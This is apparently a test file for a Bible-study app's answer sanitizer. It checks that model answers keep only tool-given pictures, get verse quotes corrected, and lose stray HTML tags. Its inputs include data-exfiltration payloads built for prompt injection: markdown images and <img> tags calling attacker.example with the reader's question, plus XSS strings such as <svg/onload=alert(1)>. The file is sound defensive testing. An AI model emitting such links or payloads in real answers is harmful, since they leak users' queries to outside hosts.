import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { build } from "esbuild";

// Every Ask answer passes one final step (src/answer-final.ts) before a reader sees it or it is kept:
// pictures only from this run's tools (OWASP LLM05/LLM02), Scripture quotes checked (LLM09).
// Placeholder verse text only: no Scripture is written here.
const out = new URL("./.build/answer-final.mjs", import.meta.url).pathname;
await build({ entryPoints: [new URL("../src/answer-final.ts", import.meta.url).pathname], bundle: true, format: "esm", platform: "node", packages: "external", outfile: out, logLevel: "error", plugins: [{ name: "data", setup(b) {
  b.onResolve({ filter: /^\.\/data$/ }, () => ({ path: "data", namespace: "fixture" }));
  b.onLoad({ filter: /.*/, namespace: "fixture" }, () => ({ loader: "js", contents:
    `export async function books(env) { env.lookups.push("books"); return [{ book: "Exodus", slug: "exodus", chapters: 40 }]; }
     export async function chapter(env, slug, ch) { env.lookups.push(slug + "/" + ch); if (env.unreadable) throw new Error("R2 down"); return { verses: [{ verse: 14, text: "Placeholder verse text for the test." }] }; }` }));
} }] });
const { finalAnswer, checkedVerses, onlyGivenPictures, picturesIn, passageEvidence, pictureLines, pictureStream, guardedStream, FINAL_STEP } = await import(out);
const env = () => ({ lookups: [] });

test("a picture a tool gave is kept; any other image becomes its alt text", async () => {
  const evidence = ["Person: Placeholder. Picture: /people/placeholder.jpg", "Timeline: x. Picture: /timeline/a.png (caption)"];
  const answer = [
    "Intro.",
    "![The given picture](/people/placeholder.jpg)",
    "![Second given](/timeline/a.png)",
    "![leak](https://attacker.example/?q=the+reader+question)",
    "![same host, other path](/people/other.jpg)",
    '![titled](/people/placeholder.jpg?x=1 "t")',
    "![ref style][1]",
    '<img src="https://attacker.example/p.gif">',
    "End.",
  ].join("\n");
  const e = env();
  const text = await finalAnswer(e, answer, { evidence });
  assert.match(text, /!\[The given picture\]\(\/people\/placeholder\.jpg\)/);
  assert.match(text, /!\[Second given\]\(\/timeline\/a\.png\)/);
  assert.doesNotMatch(text, /attacker|other\.jpg|\?x=1|<img|!\[ref style\]/);
  for (const alt of ["leak", "same host, other path", "titled", "ref style"]) assert.ok(text.split("\n").includes(alt), `alt kept: ${alt}`);
  assert.deepEqual(e.lookups, [], "no Scripture quote, so no lookup");
});

test("with no tool picture at all, every image is dropped, and text without images is untouched", async () => {
  assert.equal((await finalAnswer(env(), "![x](/people/a.jpg) text")), "x text");
  const plain = "Plain words [1], a link [here](/classes/a) and no images.";
  assert.equal(await finalAnswer(env(), plain), plain, "a normal link is not an image");
  assert.equal(onlyGivenPictures("![a]()", new Set()).text, "a");
});

test("picture addresses come only from the run's own tool text and passages", () => {
  assert.deepEqual([...picturesIn(["a Picture: /people/1.jpg, and Picture: /timeline/2.png.", null, undefined, "Picture:/library/3.jpg"])], ["/people/1.jpg", "/timeline/2.png", "/library/3.jpg"]);
  assert.deepEqual([...picturesIn(["Picture: /p/1.jpg", "Picture: https://attacker.example/a.png", "Picture: /people/../x.jpg"])], [], "only the app's own picture files");
  assert.deepEqual(passageEvidence([{ title: "T", text: "Picture: /p.jpg" }]), ["T", "Picture: /p.jpg"]);
});

test("a misquoted verse is corrected to the King James text in the final step", async () => {
  const e = env();
  const text = await finalAnswer(e, "Intro.\n> Words the model made up. **Exodus 12:14**\nEnd.");
  assert.match(text, /^> Placeholder verse text for the test\. \*\*Exodus 12:14\*\*/m);
  assert.doesNotMatch(text, /made up/);
  assert.deepEqual(e.lookups, ["books", "exodus/12"]);
});

test("when a chapter can't be read, the quote stays as written and the check says it wasn't verified", async () => {
  const quote = "Intro.\n> Words the model made up. **Exodus 12:14**\nEnd.";
  const e = { ...env(), unreadable: true };
  const r = await checkedVerses(e, quote);
  assert.equal(r.text, quote);
  assert.equal(r.verified, false);
  const status = { verified: true };
  assert.equal(await finalAnswer(e, quote, { status }), quote);
  assert.equal(status.verified, false, "finalAnswer reports it");
  const ok = { verified: true };
  await finalAnswer(env(), quote, { status: ok });
  assert.equal(ok.verified, true);
  assert.equal((await checkedVerses(env(), "No quote here.")).verified, true);
});

test("an owner-approved answer's own app pictures are trusted, and only those", async () => {
  const answer = "![Own](/people/placeholder.jpg)\n![Out](https://attacker.example/a.png)\n![Not app](/elsewhere/a.png)";
  const text = await finalAnswer(env(), answer, { trustOwnPictures: true });
  assert.match(text, /!\[Own\]\(\/people\/placeholder\.jpg\)/);
  assert.doesNotMatch(text, /attacker|!\[Not app\]/);
});

test("only a tool's Picture: lines are kept as evidence, however long the text, so a late picture isn't cut off", () => {
  const long = `${"x".repeat(80_000)}\nPicture: /people/late.jpg\n`;
  assert.deepEqual(pictureLines(long), ["Picture: /people/late.jpg"]);
  assert.deepEqual([...picturesIn(pictureLines(long))], ["/people/late.jpg"]);
});

// The stream a reader watches: no image or tag is sent before it is checked.
const given = () => ["Picture: /people/placeholder.jpg"];
test("stream guard: an image split across deltas is held until its line ends, then checked", () => {
  const g = pictureStream(given);
  const out = ["Before ![x](https://att", "acker.example/?q=1) after", "\nNext ![Ok](/people/", "placeholder.jpg)\n"].map((d) => g.push(d));
  assert.equal(out[0], "Before ");
  assert.equal(out[1], "", "nothing of the image goes out mid-line");
  assert.equal(out.join(""), "Before x after\nNext ![Ok](/people/placeholder.jpg)\n");
  assert.doesNotMatch(out.join(""), /attacker/);
  assert.equal(g.dropped, 1);
});

test("stream guard: an <img mid-line is removed, a plain <br> and words after a ! are kept", () => {
  const g = pictureStream(given);
  const sent = g.push("Text <img src=\"https://attacker.example/p.gif\"> more\n") + g.push("Amen! line<br>\nend") + g.flush();
  assert.equal(sent, "Text  more\nAmen! line<br>\nend");
});

test("stream guard: a tag split across lines never goes out as a tag, and nothing waits past its line", () => {
  const g = pictureStream(given);
  const out = [g.push("Text <img\n"), g.push("src=\"https://attacker.example/?d=1\">\n"), g.push("after\n")];
  assert.equal(out[0], "Text img\n", "the unfinished tag's < is dropped at the end of its line");
  assert.doesNotMatch(out.join(""), /</);
  assert.equal(out[2], "after\n");
});

test("stream guard: a comment is held until its -->, so what it hides never streams out", () => {
  const g = pictureStream(given);
  const out = [g.push("Shown <!-- hidden\n"), g.push("secret line -->\n"), g.push("after\n")];
  assert.equal(out[0], "Shown ");
  assert.equal(out[1], "\n", "the whole comment went out removed, once closed");
  assert.doesNotMatch(out.join(""), /hidden|secret/);
  assert.equal(out[2], "after\n");
});

test("stream guard: a stray 'a<b' doesn't freeze the stream past its line", () => {
  const g = pictureStream(given);
  assert.equal(g.push("Compare a<b here\n"), "Compare ab here\n");
  assert.equal(g.push("then more words"), "then more words");
});

test("tags are removed whole: '/' separators, '<' inside values, ? and ! forms; <br> and autolinks stay", () => {
  for (const bad of ["<img/src=https://e.example/x?d=1>", "<svg/onload=alert(1)>", '<img alt="<" src=https://e.example/p>', "<?xml x?>", "<!doctype html>", "<!-- c -->", "</div>"])
    assert.equal(onlyGivenPictures(`A ${bad} B`, new Set()).text, "A  B", bad);
  assert.equal(onlyGivenPictures("A <img src=https://e.example/p B", new Set()).text, "A img src=https://e.example/p B", "an unfinished tag loses its <");
  assert.equal(onlyGivenPictures("a<br>b<br/>c <https://cyberjudah.io/bs> a < b", new Set()).text, "a<br>b<br/>c <https://cyberjudah.io/bs> a < b");
});

test("removing malformed markup cannot reconstruct raw tags or comment openers", () => {
  const opener = /<[A-Za-z/!?]/;
  for (const input of ["<<div\ndata-note=sample>", "<<!-- -->!-- sample", "<<div", "<div<div>div>", "<\n!-- sample -->",
    "<<script>script>x</script>", "<!<!-- x -->-- hidden -->", "<im<b>g src=https://e.example/p>", "&l<b>t;div>", "&l<t;a", "&l<b>t;!-- c -->", "< <<b>a", "<<<<b>b>c>"]) {
    const once = onlyGivenPictures(input, new Set()).text;
    assert.doesNotMatch(once, opener, input);
    assert.ok(!once.includes("\uE002"), `${input}: no placeholder is left`);
    assert.equal(onlyGivenPictures(once, new Set()).text, once, input);
  }
});

test("runs of '<', joined images and private-use characters can't make a tag, comment or image", () => {
  const ok = new Set(["/brand/placeholder.png"]);
  for (const [input, want] of [
    ["<<![a](/brand/placeholder.png)", "![a](/brand/placeholder.png)"],
    ["<<<![a](/brand/placeholder.png) b", "![a](/brand/placeholder.png) b"],
    ["< <![a](/brand/placeholder.png)", "< ![a](/brand/placeholder.png)"],
    ["!<b>[x](https://e.example/x)", "x"],
    ["!<b>[x](/brand/placeholder.png)", "x"],
    ["a \uE002b> \uE000x:0\uE001 c", "a b> x:0 c"],
    ["!!![x](https://e.example/x) and !!![y", "!!x and [y"],
  ]) {
    const out = onlyGivenPictures(input, ok).text;
    assert.equal(out, want, input);
    assert.doesNotMatch(out.replace(/!\[a\]\(\/brand\/placeholder\.png\)/g, ""), /<[A-Za-z/!?]|!\[/, input);
  }
  // A caption keeps no tag at all, not even an autolink or <br>.
  assert.equal(onlyGivenPictures("![<https://e.example/x> a<br>b](/brand/placeholder.png)", ok).text, "![ ab](/brand/placeholder.png)");
});

test("a long run of nested pieces is cleaned in one pass", () => {
  const k = 20000, input = "&l".repeat(k) + "<b>" + "t;".repeat(k) + "a";
  const t = Date.now(), r = onlyGivenPictures(input, new Set());
  assert.ok(Date.now() - t < 500, `${Date.now() - t} ms`);
  assert.equal(r.dropped, 1);
  assert.doesNotMatch(r.text, /</);
});

test("streamed: a sent '<' or '!' never joins what the held text becomes", () => {
  const ok = ["Picture: /brand/placeholder.png"];
  for (const input of ["x <<!-- c -->!-- y\n", "<<b>a\n", "<<b>/x\n", "<<![a](/brand/placeholder.png)\n", "!<b>[x](https://e.example/x)\n", "a <", "<b>b\n",
    "x!![foo\nbar](https://e.example/x.png)\n", "x!!<b>[foo\nbar](https://e.example/x.png)\n", "!![a", "Wow!!! fine\n"]) {
    for (const cut of [1, 2, 3, input.length]) {
      const g = pictureStream(() => ok);
      const parts = [];
      for (let i = 0; i < input.length; i += cut) parts.push(input.slice(i, i + cut));
      const out = parts.map((d) => g.push(d)).join("") + g.flush();
      assert.doesNotMatch(out.replace(/!\[a\]\(\/brand\/placeholder\.png\)/g, ""), /<[A-Za-z/!?]|!\[/, `${JSON.stringify(input)} in pieces of ${cut}: ${JSON.stringify(out)}`);
    }
  }
});

test("a '<' that starts no tag stays as written, and text entities are left alone", () => {
  for (const plain of ["a < b", "1 <2", "x<", "<3 and <= and << and <-", "a &lt;b> stays", "&amp;lt; too"])
    assert.equal(onlyGivenPictures(plain, new Set()).text, plain, plain);
});

test("a kept picture's caption stays as written, without markup; a '<' before it can't make '<!'", () => {
  const ok = new Set(["/brand/placeholder.png"]);
  assert.equal(onlyGivenPictures("![1 < 2 caption](/brand/placeholder.png)", ok).text, "![1 < 2 caption](/brand/placeholder.png)");
  assert.equal(onlyGivenPictures("![<div>caption</div>](/brand/placeholder.png)", ok).text, "![caption](/brand/placeholder.png)");
  const joined = onlyGivenPictures("<![x](/brand/placeholder.png)", ok).text;
  assert.equal(joined, "![x](/brand/placeholder.png)");
  assert.equal(onlyGivenPictures("a <![x](/brand/placeholder.png) b", ok).text, "a ![x](/brand/placeholder.png) b");
});

test("a stray '<' or an unclosed comment never deletes text past its own line", () => {
  const answer = "Jacob<Israel and more\n\n> In the beginning [1]\nEnd.";
  assert.equal(onlyGivenPictures(answer, new Set()).text, "JacobIsrael and more\n\n> In the beginning [1]\nEnd.");
  assert.equal(onlyGivenPictures("Before <!-- never closed\nThe rest stays.", new Set()).text, "Before \nThe rest stays.", "an unclosed comment hides only the rest of its line");
  assert.equal(onlyGivenPictures("A <!-- closed --> B", new Set()).text, "A  B");
});

test("mail autolinks stay; a <?...> is caught by the final step's gate too", async () => {
  assert.equal(onlyGivenPictures("Write <mailto:a@cyberjudah.io> or <a@cyberjudah.io>.", new Set()).text, "Write <mailto:a@cyberjudah.io> or <a@cyberjudah.io>.");
  for (const bad of ["<javascript:alert(1)@x>", "<tg:resolve@x.y>", "<intent:x@y.z>", "<mailto:a@b.c?x=<y>>"]) assert.doesNotMatch(onlyGivenPictures(`A ${bad} B`, new Set()).text, /<(javascript|tg|intent|mailto:a@b\.c\?)/, bad);
  assert.equal(await finalAnswer(env(), "A <?php x ?> B"), "A  B");
});

test("an outside web page's text never allows a picture", () => {
  const ev = passageEvidence([{ kind: "web", title: "Outside", text: "Picture: /people/placeholder.jpg" }, { kind: "note", title: "Class", text: "Picture: /timeline/a.png" }]);
  assert.deepEqual([...picturesIn(ev)], ["/timeline/a.png"]);
});

test("a kept picture's mark can't be forged by text in the answer", () => {
  // Private-use characters (the marks' own) are removed from the answer first.
  const text = "Text \u00000\u0000 and \uE000x:0\uE001\n![Ok](/people/placeholder.jpg)";
  assert.equal(onlyGivenPictures(text, new Set(["/people/placeholder.jpg"])).text, "Text \u00000\u0000 and x:0\n![Ok](/people/placeholder.jpg)");
});

test("stream guard: a ! or < that can't start an image or tag doesn't hold the line", () => {
  const g = pictureStream(given);
  assert.equal(g.push("Praise Him! He said a < b and <https://cyberjudah.io/bs> too"), "Praise Him! He said a < b and ");
  assert.equal(g.flush(), "<https://cyberjudah.io/bs> too", "an autolink is not a tag");
});

test("stream guard: pictures from passages the stream announces count", () => {
  const sent = [];
  const s = guardedStream((e) => sent.push(e), () => []);
  s.emit({ passages_delta: [{ title: "P", text: "Picture: /library/x.webp" }] });
  s.emit({ delta: "![X](/library/x.webp)\n" });
  assert.deepEqual(sent.at(-1), { delta: "![X](/library/x.webp)\n" });
});

test("stream guard: reset forgets what was held for a cleared draft", () => {
  const g = pictureStream(given);
  assert.equal(g.push("Draft ![x](https://attacker.example/"), "Draft ");
  g.reset();
  assert.equal(g.push("Fresh\n") + g.flush(), "Fresh\n");
});

test("guardedStream.settle: replaces the draft when the final text differs or anything was held back, else sends the rest", () => {
  const run = (deltas, final, draft) => { const sent = []; const s = guardedStream((e) => sent.push(e), given); for (const d of deltas) s.emit({ delta: d }); s.emit({ status: "x" }); s.settle(final, draft); return sent; };
  // Nothing held back and nothing changed: no reset; the held tail (a "!" line) is sent at the end.
  assert.deepEqual(run(["Hello world", " Amen!"], "Hello world Amen!", "Hello world Amen!"), [{ delta: "Hello world" }, { delta: " Amen" }, { status: "x" }, { delta: "!" }]);
  // Plain text, unchanged: no reset, nothing more.
  assert.deepEqual(run(["Hello"], "Hello", "Hello"), [{ delta: "Hello" }, { status: "x" }]);
  // The final step changed the text (a verse corrected): reset, then the final text.
  assert.deepEqual(run(["Draft"], "Final", "Draft").slice(-2), [{ reset: true }, { delta: "Final" }]);
  // An image was held back: reset, then the final text, even when the final equals the draft.
  const held = run(["A ![x](https://attacker.example/)\n"], "A x\n", "A x\n");
  assert.deepEqual(held.slice(-2), [{ reset: true }, { delta: "A x\n" }]);
  assert.ok(held.every((e) => !JSON.stringify(e).includes("attacker")));
});

// The answer paths in ai.ts. Each answer a model wrote must pass finalAnswer; each other answer is a
// fixed sentence or an owner-approved answer (itself passed through finalAnswer by approvedFinal).
// A new path changes this list, so it has to be classified here on purpose.
const ai = readFileSync(new URL("../src/ai.ts", import.meta.url), "utf8");
function answerFields(src) {
  const found = [];
  for (const m of src.matchAll(/\{\s*(ok: true|done: true)\b/g)) {
    let depth = 0, i = m.index;
    for (; i < src.length; i++) { const c = src[i]; if ("{([".includes(c)) depth++; else if ("})]".includes(c) && --depth === 0) break; }
    let d = 0, cur = ""; const props = [];
    for (const c of src.slice(m.index + 1, i)) { if ("{([".includes(c)) d++; if ("})]".includes(c)) d--; if (c === "," && d === 0) { props.push(cur.trim()); cur = ""; } else cur += c; }
    props.push(cur.trim());
    const a = props.find((p) => /^answer\b/.test(p));
    if (a) found.push(`${m[1]} ${a.replace(/\s+/g, " ")}`);
  }
  return found.sort();
}

test("every answer path in ai.ts is a final answer, a fixed sentence or an approved answer", () => {
  assert.deepEqual(answerFields(ai), [
    // Shorthand `answer` / `clean`: bound by `= await finalAnswer(` (checked below).
    "done: true answer", "done: true answer", "done: true answer: approved.answer", "done: true answer: clean", "done: true answer: gap.answer",
    "ok: true answer", "ok: true answer", "ok: true answer", "ok: true answer",
    // Fixed sentences no model wrote: notInTheClasses (gap, none) and the two "no cited answer" lines.
    'ok: true answer: "The search did not find enough reliable material in the library to answer that question."',
    "ok: true answer: approved.answer", "ok: true answer: approved.answer",
    'ok: true answer: gap ? "I could not find material answering this directly." : "I could not produce a cited answer from the library material I found."',
    "ok: true answer: gap.answer", "ok: true answer: none.answer",
  ].sort());
  // Each model-written answer variable is assigned from finalAnswer, and nothing else names a draft as the answer.
  assert.equal((ai.match(/const answer = await finalAnswer\(/g) ?? []).length, 4, "ask (agent, backup), the app agent and askStream with research");
  assert.equal((ai.match(/const clean = await finalAnswer\(/g) ?? []).length, 1, "askStream backup");
  assert.match(ai, /return \{ answer: await finalAnswer\(env, answer,/, "the bounded answer's clean()");
  assert.match(ai, /answer: await finalAnswer\(env, study\.answer,/, "the study answer");
  // Every approved answer goes through approvedFinal; approvedFor's raw result is never answered.
  assert.equal((ai.match(/approvedFor\(/g) ?? []).length, (ai.match(/const approvedRaw = approvedFor\(/g) ?? []).length, "approvedFor is only ever called as approvedRaw");
  assert.equal((ai.match(/const approved = approvedRaw && await approvedFinal\(env, approvedRaw\);/g) ?? []).length, 3);
  // Kept answers pass the final step again when given (answers kept before it existed).
  assert.equal((ai.match(/cachedAnswer</g) ?? []).length, (ai.match(/return \{ \.\.\.\(await keptFinal\(env, kept\)\)/g) ?? []).length, "every cache hit goes through keptFinal");
  // Approved answers trust only their own app pictures.
  assert.match(ai, /finalAnswer\(env, approved\.answer, \{ evidence: [^}]*trustOwnPictures: true \}\)/);
  // Every stream the reader watches is guarded, and settled at the end (no bare reset-and-resend).
  assert.equal((ai.match(/guardedStream</g) ?? []).length, 4, "askStream (research, backup), answerAppAgent, boundedAnswer");
  assert.doesNotMatch(ai, /!== (drafted|draft)\) \{ (send|emit)\(\{ reset: true \}\)/);
  const agent = readFileSync(new URL("../src/agent.ts", import.meta.url), "utf8");
  // The agent keeps only the picture tools' Picture: lines as evidence, never a cut of the text, and
  // never from an outside page or a saved chat.
  assert.match(agent, /PICTURE_TOOLS = new Set\(\["person", "timeline"\]\)/);
  assert.match(agent, /PICTURE_TOOLS\.has\(name\) && typeof result\.content === "string"\) control\.evidence/);
  // A retried bounded answer is always replaced, even when the retry fails part-way (set before it runs).
  assert.match(ai, /retried = true;[^\n]*\n\s*try \{\n\s*const ran = await write\(true\);/);
  assert.match(ai, /guard\?\.settle\(answer, drafted, retried\)/);
  assert.match(agent, /control\.evidence\?\.push\(\.\.\.pictureLines\(result\.content\)\)/);
  assert.doesNotMatch(agent, /evidence\?\.push\([^)]*slice\(/);
  // The verse check lives only in the final step.
  assert.doesNotMatch(ai, /guardVerses|checkedVerses/);
  // Every research run passes its evidence list, so a tool's picture can be recognised.
  assert.equal((ai.match(/runAgent\(/g) ?? []).length, (ai.match(/deadlineAt: [^}]*, evidence \}/g) ?? []).length);
});

// End to end on the app's agent path, with the agent standing in: an image the tools never gave is
// dropped before the reader's final text and before the answer is kept; the tool's own picture stays.
const kv = () => { const m = new Map(); return { m, get: async (k) => m.get(k) ?? null, put: async (k, v) => { m.set(k, v); }, delete: async (k) => { m.delete(k); } }; };
const { DatabaseSync } = await import("node:sqlite");
const d1 = () => { const db = new DatabaseSync(":memory:"); const bound = (q, a) => ({ first: async () => db.prepare(q).get(...a) ?? null, all: async () => ({ results: db.prepare(q).all(...a) }), run: async () => { if (/RETURNING/i.test(q)) { const results = db.prepare(q).all(...a); return { results, meta: { changes: results.length } }; } const r = db.prepare(q).run(...a); return { results: [], meta: { changes: Number(r.changes ?? 0) } }; } }); return { prepare: (q) => ({ bind: (...a) => bound(q, a), ...bound(q, []) }), batch: async (s) => Promise.all(s.map((x) => x.run())) }; };
const aiOut = new URL("./.build/answer-final-ai.mjs", import.meta.url).pathname;
await build({ stdin: { contents: 'export { answerAppAgent } from "./src/ai.ts";', resolveDir: new URL("..", import.meta.url).pathname, loader: "ts" }, bundle: true, format: "esm", platform: "node", packages: "external", outfile: aiOut, logLevel: "error", plugins: [{ name: "agent", setup(b) {
  b.onResolve({ filter: /^\.\/agent$/ }, (args) => args.importer.endsWith("ai.ts") ? { path: "agent", namespace: "fixture" } : undefined);
  b.onLoad({ filter: /.*/, namespace: "fixture" }, () => ({ loader: "js", contents:
    `export async function runAgent(env, q, h, f, r, emit, ctx, uid, model, spend, res, rounds, cite, control) {
       control.evidence.push("Person: Placeholder. Picture: /people/placeholder.jpg");
       emit({ delta: env.draft });
       return { text: env.draft, units: 0, calls: 1, cut: false, refused: false, grounded: true, actions: [], plan: null, tracked: false,
         passages: [{ n: 1, kind: "note", title: "A class", url: "/classes/a", text: "Recorded class words." }] }; }
     export const claudeUnavailable = () => false; export const alertClaudeFunds = async () => {};` }));
} }] });
const { answerAppAgent } = await import(aiOut);

test("the app's agent answer passes the final step: an injected image is dropped, the reader gets the final text", async () => {
  const draft = "Keep it [1].\n\n![Placeholder](/people/placeholder.jpg)\n\n![x](https://attacker.example/?q=secret)";
  const env = { DB: d1(), SUBS: kv(), PRIVACY_KEY: "test-key", AI_GATEWAY: "fixture", draft,
    ASK_FREE_MODEL: "@cf/google/gemma-4-26b-a4b-it", ASK_FREE_MODELS: "@cf/google/gemma-4-26b-a4b-it",
    AI: { run: async () => ({ data: [[0.1, 0.2]] }) }, VEC: { query: async () => ({ matches: [] }) } };
  const events = [];
  const r = await answerAppAgent(env, "Why do we keep the Passover?", "acct-final", [], ["Cloudflare (Workers AI)"], { emit: (e) => events.push(e) });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.doesNotMatch(r.answer, /attacker/);
  assert.match(r.answer, /!\[Placeholder\]\(\/people\/placeholder\.jpg\)/);
  assert.deepEqual(events.slice(-2), [{ reset: true }, { delta: r.answer }], "the streamed draft is replaced by the final text");
  assert.ok(events.slice(0, -2).every((e) => !JSON.stringify(e).includes("attacker")), "the injected image never reached the live draft");
  const kept = [...env.SUBS.m.entries()].filter(([k]) => k.startsWith("ask_cache:")).map(([, v]) => v);
  assert.equal(kept.length, 1);
  assert.doesNotMatch(kept[0], /attacker/, "the cache keeps only the final text");
});

test("a kept answer passes the final step again when it is given from the cache", async () => {
  const draft = "Keep it [1].";
  const env = { DB: d1(), SUBS: kv(), PRIVACY_KEY: "test-key", AI_GATEWAY: "fixture", draft,
    ASK_FREE_MODEL: "@cf/google/gemma-4-26b-a4b-it", ASK_FREE_MODELS: "@cf/google/gemma-4-26b-a4b-it",
    AI: { run: async () => ({ data: [[0.1, 0.2]] }) }, VEC: { query: async () => ({ matches: [] }) } };
  const ask = () => answerAppAgent(env, "Why do we keep the Passover?", "acct-cache", [], ["Cloudflare (Workers AI)"], {});
  assert.equal((await ask()).ok, true);
  const [[key, value]] = [...env.SUBS.m.entries()].filter(([k]) => k.startsWith("ask_cache:"));
  assert.equal(JSON.parse(value).final_step, FINAL_STEP, "kept with the final step's version");
  // An answer kept before the final step existed (no version mark): it carries an outside image.
  const old = JSON.parse(value);
  delete old.final_step;
  old.answer += "\n![x](https://attacker.example/?q=old)\n![Own](/people/placeholder.jpg)";
  env.SUBS.m.set(key, JSON.stringify(old));
  env.draft = "A fresh draft would differ.";
  const again = await ask();
  assert.equal(again.ok, true);
  assert.match(again.answer, /^Keep it \[1\]\./, "given from the cache");
  assert.doesNotMatch(again.answer, /attacker/);
  assert.match(again.answer, /!\[Own\]\(\/people\/placeholder\.jpg\)/, "its own app picture is kept");
  assert.equal(again.final_step, undefined, "the mark isn't given to readers");
  assert.equal(JSON.parse(env.SUBS.m.get(key)).final_step, undefined, "not written back (its time to live and a deletion stay as they were)");
});

test("an answer whose verse check couldn't read the King James text is kept without the final mark, so it is checked again", async () => {
  const draft = "Keep it [1].\n> Placeholder quote words here. **Exodus 12:14**";
  const env = { DB: d1(), SUBS: kv(), PRIVACY_KEY: "test-key", AI_GATEWAY: "fixture", draft,
    ASK_FREE_MODEL: "@cf/google/gemma-4-26b-a4b-it", ASK_FREE_MODELS: "@cf/google/gemma-4-26b-a4b-it",
    AI: { run: async () => ({ data: [[0.1, 0.2]] }) }, VEC: { query: async () => ({ matches: [] }) } };
  // No data store in this env: books() and chapter() can't be read.
  const r = await answerAppAgent(env, "Why do we keep the Passover?", "acct-unread", [], ["Cloudflare (Workers AI)"], {});
  assert.equal(r.ok, true, JSON.stringify(r));
  const [[, value]] = [...env.SUBS.m.entries()].filter(([k]) => k.startsWith("ask_cache:"));
  assert.equal(JSON.parse(value).final_step, undefined, "not marked final: the next hit checks it again");
});
